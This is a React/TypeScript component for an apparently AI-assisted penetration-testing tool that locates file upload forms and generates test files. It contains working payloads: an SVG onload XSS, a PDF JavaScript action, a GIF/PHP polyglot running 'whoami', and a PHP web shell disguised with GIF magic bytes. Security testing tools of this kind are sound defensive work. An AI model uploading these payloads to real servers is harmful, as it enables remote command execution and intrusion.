// @author: Albert C | @yz9yt | github.com/yz9yt
// components/FileUploadAuditor.tsx
// version 0.1 Beta
import React, { useState, useCallback } from 'react';
import { analyzeFileUpload } from '../services/Service.ts';
import { FileUploadAnalysisResult, VulnerabilityReport, Severity } from '../types.ts';
import { useApiOptions } from '../hooks/useApiOptions.ts';
import { Spinner } from './Spinner.tsx';
import { ArrowUpTrayIcon, ScanIcon, FileCodeIcon, ArrowDownTrayIcon } from './Icons.tsx';
import { ToolLayout } from './ToolLayout.tsx';
import { MarkdownRenderer } from './MarkdownRenderer.tsx';

interface FileUploadAuditorProps {
  onAnalysisStart: () => void;
  onAnalysisComplete: (report: VulnerabilityReport) => void;
  onAnalysisError: (message: string) => void;
  onShowApiKeyWarning: () => void;
  isLoading: boolean;
}

interface GeneratedFile {
  name: string;
  blob: Blob;
  description: string;
  technique: string;
  content?: string;
}

const ResultCard: React.FC<{ result: FileUploadAnalysisResult }> = ({ result }) => (
    <div className="mt-6 bg-control-bg/50 p-6 rounded-lg border border-control-border animate-fade-in">
        {result.found ? (
            <div>
                <h4 className="text-lg font-bold text-green-400 mb-2">Upload Form Found!</h4>
                <div className="text-text-secondary mb-4">
                    <MarkdownRenderer content={result.description} />
                </div>
                <div>
                    <h5 className="font-semibold text-cyan-300 mb-2">Manual Testing Guide</h5>
                    <div className="mt-1">
                        <MarkdownRenderer content={result.manualTestingGuide} />
                    </div>
                </div>
            </div>
        ) : (
            <div>
                <h4 className="text-lg font-bold text-orange-400 mb-2">No Upload Form Found</h4>
                <div className="text-text-secondary">
                    <MarkdownRenderer content={result.description} />
                </div>
            </div>
        )}
    </div>
);

const GeneratedFileCard: React.FC<{ file: GeneratedFile }> = ({ file }) => {
    const [showContent, setShowContent] = useState(false);

    const handleDownload = () => {
        const url = URL.createObjectURL(file.blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = file.name;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };

    return (
        <div className="bg-control-bg/50 p-4 rounded-lg border border-control-border transition-all hover:border-cyan-400/50">
            <h5 className="text-lg font-bold text-cyan-300">{file.technique}</h5>
            <p className="text-text-secondary text-sm my-2">{file.description}</p>
            <div className="mt-4 flex flex-wrap gap-2">
                <button
                    onClick={handleDownload}
                    className="flex items-center gap-2 px-3 py-1.5 text-xs font-semibold text-purple-200 bg-purple-900/40 border border-purple-700/80 rounded-lg hover:bg-purple-900/60 transition-colors"
                    title={`Download ${file.name}`}
                >
                    <ArrowDownTrayIcon className="h-4 w-4" />
                    Download {file.name}
                </button>
                {file.content && (
                    <button
                        onClick={() => setShowContent(!showContent)}
                        className="flex items-center gap-2 px-3 py-1.5 text-xs font-semibold text-gray-300 bg-gray-700/40 border border-gray-600/80 rounded-lg hover:bg-gray-700/60 transition-colors"
                        title={showContent ? 'Hide file content' : 'View file content'}
                    >
                         <FileCodeIcon className="h-4 w-4" />
                        {showContent ? 'Hide' : 'View'} Content
                    </button>
                )}
            </div>
            {showContent && file.content && (
                 <pre className="mt-4 bg-black/40 p-3 rounded-md font-mono text-xs text-orange-300 overflow-x-auto border border-orange-900/50">
                    <code>{file.content}</code>
                </pre>
            )}
        </div>
    );
};


export const FileUploadAuditor: React.FC<FileUploadAuditorProps> = ({ onAnalysisStart, onAnalysisComplete, onAnalysisError, onShowApiKeyWarning, isLoading }) => {
    const [url, setUrl] = useState<string>('');
    const [error, setError] = useState<string | null>(null);
    const [analysisResult, setAnalysisResult] = useState<FileUploadAnalysisResult | null>(null);
    const { apiOptions, isApiKeySet } = useApiOptions();
    
    const [payload, setPayload] = useState<string>('<script>alert("XSS from file upload")</script>');
    const [generatedFiles, setGeneratedFiles] = useState<GeneratedFile[]>([]);
    
    const handleAnalyze = useCallback(async () => {
        if (!isApiKeySet) {
            onShowApiKeyWarning();
            return;
        }
        if (!url.trim() || !url.startsWith('http')) {
            setError('Please enter a valid URL (e.g., https://example.com).');
            return;
        }
        setError(null);
        setAnalysisResult(null);
        
        onAnalysisStart();
        try {
            const result = await analyzeFileUpload(url, apiOptions!);
            setAnalysisResult(result);
            
            const report: VulnerabilityReport = {
                analyzedTarget: `File Upload Audit: ${url}`,
                vulnerabilities: result.found ? [{
                    vulnerability: 'File Upload Form Detected',
                    severity: Severity.INFO,
                    description: result.description,
                    impact: 'A file upload functionality was found. If not properly secured, it could be a vector for various attacks like shell uploads, cross-site scripting (XSS), or denial-of-service.',
                    recommendation: result.manualTestingGuide,
                    vulnerableCode: 'N/A'
                }] : []
            };
            onAnalysisComplete(report);

        } catch (e: any) {
            const errorMessage = e.message || 'An unexpected error occurred during analysis.';
            setError(errorMessage);
            onAnalysisError(errorMessage);
        }
    }, [url, onAnalysisStart, onAnalysisComplete, onAnalysisError, apiOptions, isApiKeySet, onShowApiKeyWarning]);

    const handleGenerateFiles = () => {
        const files: GeneratedFile[] = [];

        const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" onload="${payload.replace(/"/g, '&quot;')}"></svg>`;
        files.push({
            name: 'payload.svg',
            blob: new Blob([svgContent], { type: 'image/svg+xml' }),
            description: 'A valid SVG image that executes a JavaScript payload upon rendering.',
            technique: 'SVG with Embedded Script',
            content: svgContent
        });
        
        const pdfJsPayload = `app.alert({cMsg: "XSS From PDF", cTitle: "Payload Executed"});`;
        const pdfContent = `%PDF-1.7\\n1 0 obj\\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (${pdfJsPayload}) >> >>\\nendobj\\n2 0 obj\\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\\nendobj\\n3 0 obj\\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\\nendobj\\nxref\\n0 4\\n0000000000 65535 f\\n0000000010 00000 n\\n0000000099 00000 n\\n0000000161 00000 n\\ntrailer\\n<< /Size 4 /Root 1 0 R >>\\nstartxref\\n224\\n%%EOF`;
        files.push({
            name: 'payload.pdf',
            blob: new Blob([pdfContent], { type: 'application/pdf' }),
            description: 'A PDF document that executes a simple JavaScript alert when opened.',
            technique: 'PDF with JavaScript Action',
            content: pdfContent
        });

        const gifHeaderBase64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
        const gifHeader = atob(gifHeaderBase64);
        const phpPayload = `<?php /* GIF89a */ system('whoami'); ?>`;
        const polyglotContent = new TextEncoder().encode(gifHeader + phpPayload);
        files.push({
            name: 'payload.php.gif',
            blob: new Blob([polyglotContent], { type: 'image/gif' }),
            description: 'A file that is both a valid GIF image and a PHP script. Can bypass validation that checks image headers.',
            technique: 'Polyglot File (GIF + PHP)',
            content: `// --- (GIF BINARY DATA) ---\\n${phpPayload}`
        });

        const magicNumberPayload = `GIF89a;<?php echo shell_exec($_GET['cmd']); ?>`;
        files.push({
            name: 'image.php',
            blob: new Blob([magicNumberPayload], { type: 'text/php' }),
            description: 'A PHP script prepended with GIF magic bytes to trick basic MIME type validation.',
            technique: 'Fake Magic Number',
            content: magicNumberPayload
        });

        setGeneratedFiles(files);
    };

    return (
        <ToolLayout
          icon={<ArrowUpTrayIcon className="h-8 w-8 text-cyan-400" />}
          title="File Upload Auditor"
          description="A two-step tool to first find file upload forms on a website and then craft malicious files to test their security."
        >
            <div className="max-w-lg mx-auto space-y-4">
                <h4 className="text-lg font-semibold text-text-primary mb-2 text-center">Step 1: Detect Upload Form with AI</h4>
                <div className="relative w-full">
                    <input
                        type="url"
                        value={url}
                        onChange={(e) => setUrl(e.target.value)}
                        placeholder="https://example.com/profile-edit"
                        className="w-full pl-4 pr-12 py-3 bg-control-bg border border-control-border rounded-lg text-text-primary placeholder-text-tertiary focus:ring-2 focus:ring-cyan-500/50 focus:border-cyan-500 focus:outline-none transition-all duration-300"
                        disabled={isLoading}
                        onKeyDown={(e) => e.key === 'Enter' && !isLoading && handleAnalyze()}
                    />
                </div>
                <div className="text-center">
                    <button
                        onClick={handleAnalyze}
                        disabled={isLoading || !url.trim()}
                        className="group w-full sm:w-auto relative inline-flex items-center justify-center px-8 py-3 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-lg transition-all duration-300 transform hover:scale-105 disabled:scale-100 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg shadow-cyan-500/20 hover:shadow-cyan-500/40"
                        title="Scan the URL's HTML to find a file upload form"
                    >
                        {isLoading ? <Spinner /> : <ScanIcon className="h-5 w-5 mr-2" />}
                        <span className="relative">Analyze for Upload Form</span>
                    </button>
                </div>
            </div>

            {isLoading && (
                <div className="mt-6 text-center text-text-secondary animate-pulse">
                    <p>AI is analyzing the URL for file upload forms...</p>
                </div>
            )}
            {error && !isLoading && <div className="mt-6 p-4 bg-red-900/50 border border-red-700 text-red-200 rounded-lg font-mono max-w-3xl mx-auto">{error}</div>}
            {analysisResult && !isLoading && <ResultCard result={analysisResult} />}
            
            <div className="mt-12 border-t border-glass-border pt-8">
                <h4 className="text-lg font-semibold text-text-primary mb-3 text-center">Step 2: Forge Malicious Files</h4>
                 <div className="max-w-2xl mx-auto">
                    <label htmlFor="payload" className="block text-sm font-medium text-text-secondary mb-2">Payload for SVG/PDF</label>
                    <textarea
                        id="payload"
                        value={payload}
                        onChange={(e) => setPayload(e.target.value)}
                        className="w-full h-24 p-4 font-mono text-sm bg-control-bg border border-control-border rounded-lg text-text-primary focus:ring-2 focus:ring-cyan-500/50 focus:border-cyan-500 focus:outline-none transition-all duration-300 resize-y"
                    />
                </div>
                <div className="mt-6 flex justify-center">
                    <button
                      onClick={handleGenerateFiles}
                      className="group relative inline-flex items-center justify-center px-8 py-3 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-lg transition-all duration-300 transform hover:scale-105 shadow-lg shadow-purple-500/20 hover:shadow-purple-500/40"
                      title="Create various malicious file types for testing"
                    >
                        Generate Files
                    </button>
                </div>

                {generatedFiles.length > 0 && (
                     <div className="mt-8 space-y-6">
                        {generatedFiles.map((file, index) => (
                           <GeneratedFileCard key={index} file={file} />
                        ))}
                    </div>
                )}
            </div>
        </ToolLayout>
    );
};